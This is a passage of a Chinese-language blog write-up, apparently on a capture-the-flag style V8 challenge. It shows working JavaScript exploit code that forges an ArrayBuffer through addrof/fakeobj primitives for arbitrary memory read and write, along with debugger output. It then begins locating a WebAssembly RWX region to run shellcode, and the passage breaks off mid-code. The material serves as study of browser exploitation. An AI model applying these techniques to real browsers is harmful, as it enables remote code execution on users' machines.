+</span></span></code></pre></div><p>由 <code>external_pointer</code> 和 <code>base_pointer</code> 两项相加得出，并不会访问 <code>ArrayBuffer</code> 的 <code>backing_store</code>。推测是 <code>ArrayBuffer</code> 内部的缓冲区已经被提前拷贝到 <code>TypedArray</code> 结构中了，这样的话新建一个 <code>UInt8Array</code> 应该是可以的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>d8&gt; u8a2 <span style="color:#f92672">=</span> new Uint8Array<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0,0,0,0,253,253,253,253
+</span></span><span style="display:flex;"><span>d8&gt; u8a2<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xdd
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a2<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a
+</span></span><span style="display:flex;"><span>221,187,204,0,221,0,0,0
+</span></span></code></pre></div><p><img src="/assets/images/Pasted%20image%2020220219201551.png" alt=""></p>
+<h3 id="任意内存读写-1">任意内存读写</h3>
+<p>伪造 <code>ArrayBuffer</code> 实现任意内存读写，分成下面几个步骤：</p>
+<ul>
+<li>读取 <code>ArrayBuffer</code> 的 map</li>
+<li>数组中伪造出 <code>ArrayBuffer</code></li>
+<li>利用 <code>fakeobj</code> 函数，得到伪造 <code>ArrayBuffer</code> 对象</li>
+</ul>
+<p>读取 <code>ArrayBuffer</code> 的 map 的方法和读取对象数组的类似，创建一个包含 4 个元素的对象数组和一个 <code>ArrayBuffer</code>，这样对象数组的 <code>oob</code> 函数就可以读到 <code>ArrayBuffer</code> 的 map。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read_array_buffer_map</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>]
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">map</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arr_buf</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">obj_arr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">arr_buf</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">map</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arr_buf_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_array_buffer_map</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">输出:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">800222d08203271
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">804aa9d
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">0x03ee0804aa8d &lt;JSArray[4]&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">0x03ee0804aa9d &lt;ArrayBuffer map = 000003EE08203271&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><p>接下来在数组中伪造出一个 <code>ArrayBuffer</code>，<code>ArrayBuffer</code> 总计 <code>0x30</code> 字节，创建一个 <code>6</code> 个元素的浮点数数组就应该足够了，但是如果从元素 <code>0</code> 开始布局内存的话，ByteLength、MaxByteLength、BackingStore 等元素，所在的位置就会横跨两个数组下标，赋值有些不方便。如果把 <code>ArrayBuffer</code> 的 map，放在浮点数组的第一个元素的高 <code>32 </code>位，会更方便一些，这就需要创建一个 <code>7</code> 个元素的浮点数组。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// 伪造任意ArrayBuffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fake_array_buffer</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">len</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">double_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>, <span style="color:#ae81ff">1.5</span>, <span style="color:#ae81ff">1.6</span>, <span style="color:#ae81ff">1.7</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [0x00000000, Map]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">double_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr_buf_map</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">32</span>))
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [props, elems] 不影响利用,填0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">double_arr</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">make_qword</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [ByteLenghLow, ByteLengthHigh]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">double_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">len</span>))
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [MaxByteLengthLow, MaxByteLengthHigh]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">double_arr</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">len</span>))
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [BackingStoreLow, BackingStoreHigh]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">double_arr</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">addr_fake_arr_buf_end</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr_double_arr_begin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">double_arr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">double_arr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addr_fake_arr_buf_end</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 7个元素的double数组, sizeof(ArrayBuffer)仅占6个，在Array和ArrayBuffer，有4字节大小的冗余空间没有使用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// sizeof(ArrayBuffer) + 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">addr_fake_arr_buf_begin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr_fake_arr_buf_end</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x30</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addr_fake_arr_buf_begin</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr_fake_arr_buf_begin</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fake_buf_0_3000</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fake_array_buffer</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3000</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">fake_buf_0_3000</span>);
+</span></span></code></pre></div><p>运行结果如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x026c0804b331 &lt;JSArray<span style="color:#f92672">[</span>7<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span>804b331
+</span></span><span style="display:flex;"><span>804b2fd
+</span></span><span style="display:flex;"><span>0x026c0804b2fd &lt;ArrayBuffer map <span style="color:#f92672">=</span> 0000026C08203271&gt;
+</span></span></code></pre></div><p>创建出对应的 <code>Uint8Array</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">fake_buf_0_3000</span>)
+</span></span></code></pre></div><p>调试运行，发生异常：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Fatal error in , line 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Check failed: 0 == array_buffer-&gt;byte_length().
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#FailureMessage Object: 000000792BFFDD40
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">====</span> C stack trace <span style="color:#f92672">===============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v8<span style="color:#f92672">::</span>base<span style="color:#f92672">::</span>debug<span style="color:#f92672">::</span>StackTrace<span style="color:#f92672">::</span>StackTrace [<span style="color:#ae81ff">0x00007FF605911A5B</span><span style="color:#f92672">+</span><span style="color:#ae81ff">27</span>] (C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>MSI<span style="color:#f92672">-</span>NB<span style="color:#960050;background-color:#1e0010">\</span>workspace<span style="color:#960050;background-color:#1e0010">\</span>depot_tools<span style="color:#960050;background-color:#1e0010">\</span>chromium<span style="color:#960050;background-color:#1e0010">\</span>v8<span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>base<span style="color:#960050;background-color:#1e0010">\</span>debug<span style="color:#960050;background-color:#1e0010">\</span>stack_trace_win.cc:<span style="color:#ae81ff">173</span>)
+</span></span><span style="display:flex;"><span>v8<span style="color:#f92672">::</span>platform<span style="color:#f92672">::</span><span style="color:#960050;background-color:#1e0010">`</span>anonymous <span style="color:#66d9ef">namespace</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">::</span>PrintStackTrace [<span style="color:#ae81ff">0x00007FF6058AF237</span><span style="color:#f92672">+</span><span style="color:#ae81ff">39</span>] (C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>MSI<span style="color:#f92672">-</span>NB<span style="color:#960050;background-color:#1e0010">\</span>workspace<span style="color:#960050;background-color:#1e0010">\</span>depot_tools<span style="color:#960050;background-color:#1e0010">\</span>chromium<span style="color:#960050;background-color:#1e0010">\</span>v8<span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>libplatform<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span><span style="color:#f92672">-</span>platform.cc:<span style="color:#ae81ff">28</span>)
+</span></span><span style="display:flex;"><span>V8_Fatal [<span style="color:#ae81ff">0x00007FF6058A7FE9</span><span style="color:#f92672">+</span><span style="color:#ae81ff">217</span>] (C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>MSI<span style="color:#f92672">-</span>NB<span style="color:#960050;background-color:#1e0010">\</span>workspace<span style="color:#960050;background-color:#1e0010">\</span>depot_tools<span style="color:#960050;background-color:#1e0010">\</span>chromium<span style="color:#960050;background-color:#1e0010">\</span>v8<span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>base<span style="color:#960050;background-color:#1e0010">\</span>logging.cc:<span style="color:#ae81ff">166</span>)
+</span></span><span style="display:flex;"><span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Runtime_GrowableSharedArrayBufferByteLength [<span style="color:#ae81ff">0x00007FF60539CF3C</span><span style="color:#f92672">+</span><span style="color:#ae81ff">540</span>] (C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>MSI<span style="color:#f92672">-</span>NB<span style="color:#960050;background-color:#1e0010">\</span>workspace<span style="color:#960050;background-color:#1e0010">\</span>depot_tools<span style="color:#960050;background-color:#1e0010">\</span>chromium<span style="color:#960050;background-color:#1e0010">\</span>v8<span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>runtime<span style="color:#960050;background-color:#1e0010">\</span>runtime<span style="color:#f92672">-</span>typedarray.cc:<span style="color:#ae81ff">56</span>)
+</span></span><span style="display:flex;"><span>(No symbol) [<span style="color:#ae81ff">0x0000039A000BDFDC</span>]
+</span></span></code></pre></div><p>根据异常日志和调用栈，定位到如下函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>RUNTIME_FUNCTION(Runtime_GrowableSharedArrayBufferByteLength) {
+</span></span><span style="display:flex;"><span>  HandleScope <span style="color:#a6e22e">scope</span>(isolate);
+</span></span><span style="display:flex;"><span>  DCHECK_EQ(<span style="color:#ae81ff">1</span>, args.length());
+</span></span><span style="display:flex;"><span>  CONVERT_ARG_HANDLE_CHECKED(JSArrayBuffer, array_buffer, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CHECK_EQ(<span style="color:#ae81ff">0</span>, array_buffer<span style="color:#f92672">-&gt;</span>byte_length()); <span style="color:#75715e">// ==&gt; 这个检查没有通过
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  size_t byte_length <span style="color:#f92672">=</span> array_buffer<span style="color:#f92672">-&gt;</span>GetBackingStore()<span style="color:#f92672">-&gt;</span>byte_length();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewNumberFromSize(byte_length);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>把 ByteLength 改成 0 后，<code>GetBackingStore()</code> 中又会触发其他异常，有必要深入分析一下这个函数的逻辑。分析正常的 <code>ArrayBuffer</code> 访问流程作为参照，发现程序是不会走到<code>Runtime_GrowableSharedArrayBufferByteLength</code> 的。推测是填 0 处理隐藏了真正的错误，把之前填 0 的地方全都填上了 0xCC 再运行脚本，发现问题解决了，不再出现异常了。</p>
+<p>执行 <code>view[0] = 0xAA;</code>，触发了 0x0 地址访问异常，证明我们伪造的 <code>ArrayBuffer</code> 可以正常使用了。</p>
+<h3 id="代码执行">代码执行</h3>
+<p>接下来就可以实现代码执行了。代码执行的实现，分成下面几个步骤：</p>
+<ul>
+<li>创建 <a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Concepts">WebAssembly</a> 实例</li>
+<li>读取 WASM 模块导出函数所在 RWX 内存区的地址</li>
+<li>利用任意地址读写能力，将 shellcode 写入可执行的内存</li>
+<li>调用 WASM 导出函数，触发 shellcode 执行</li>
+</ul>
+<p>使用在线工具 <a href="https://wasdk.github.io/WasmFiddle/">WasmFiddle</a>，获取 WASM 字节码。用下面的代码实例化 WASM 模块：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmModule</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasmCode</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmInstance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasmModule</span>);
+</span></span></code></pre></div><p>在源码中符串搜索，可以找到找到了 WebAssembly 编译执行中用到的两个关键函数<code>WebAssemblyModule</code> 和 <code>WebAssemblyInstance</code>。调试这两个函数, 最后找到<code>WasmInstanceObject</code> 对象的 <code>kJumpTableStartOffset</code> (<code>0x00000068</code>) 偏移处存放了 RWX 内存区的地址。</p>
+<p>读出 <code>WasmInstanceObject</code> 对象中存储的 RWX 内存区地址：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmModule</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasmCode</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmInstance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasmModule</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">wasmInstance</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">instance_start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">wasmInstance</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">instance_start</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">instruction_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">instance_start</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x68</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">instruction_ptr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fake_fixed_array_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">instruction_ptr</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">buf_for_fake_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [double_array_map, props]
